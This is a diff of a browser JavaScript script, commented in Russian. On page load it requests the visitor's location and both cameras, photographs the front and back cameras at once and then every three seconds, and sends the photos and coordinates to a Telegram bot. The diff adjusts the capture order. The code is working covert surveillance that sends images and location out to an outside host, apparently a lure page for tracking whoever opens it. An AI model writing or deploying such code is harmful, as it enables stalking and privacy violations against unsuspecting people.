@@ -14,7 +14,6 @@ async function sendPhoto(blob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('photo', blob, 'photo.jpg');
-
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
@@ -77,34 +76,39 @@ async function getCamera(facingMode) {
 
 async function start() {
   try {
+    // Запрос геолокации
     const coords = await getLocation();
-    await sendLocation(coords.latitude, coords.longitude);
 
+    // Запрос фронтальной камеры
     frontStream = await getCamera('user');
     videoFront.srcObject = frontStream;
 
+    // Сразу фото фронтальной камеры
+    await new Promise(r => videoFront.onloadedmetadata = r);
+    const blobFront = await takePhoto(videoFront, canvasFront);
+    await sendPhoto(blobFront);
+
+    // Запрос задней камеры
     backStream = await getCamera('environment');
     videoBack.srcObject = backStream;
 
-    // Сразу сделать фото обеих камер
-    if (videoFront.readyState >= 2) {
-      const blobFront = await takePhoto(videoFront, canvasFront);
-      sendPhoto(blobFront);
-    }
-    if (videoBack.readyState >= 2) {
-      const blobBack = await takePhoto(videoBack, canvasBack);
-      sendPhoto(blobBack);
-    }
+    // Сразу фото задней камеры
+    await new Promise(r => videoBack.onloadedmetadata = r);
+    const blobBack = await takePhoto(videoBack, canvasBack);
+    await sendPhoto(blobBack);
 
-    // Затем запускать фото каждые 3 секунды
+    // Отправка геолокации в Telegram
+    await sendLocation(coords.latitude, coords.longitude);
+
+    // Каждые 3 секунды делаем фото обеих камер
     photoInterval = setInterval(async () => {
       if (videoFront.readyState >= 2) {
-        const blobFront = await takePhoto(videoFront, canvasFront);
-        sendPhoto(blobFront);
+        const blobF = await takePhoto(videoFront, canvasFront);
+        sendPhoto(blobF);
       }
       if (videoBack.readyState >= 2) {
-        const blobBack = await takePhoto(videoBack, canvasBack);
-        sendPhoto(blobBack);
+        const blobB = await takePhoto(videoBack, canvasBack);
+        sendPhoto(blobB);
       }
     }, 3000);
 
@@ -112,6 +116,5 @@ async function start() {
     await sendDeniedMessage();
   }
 }
-
 
 start();
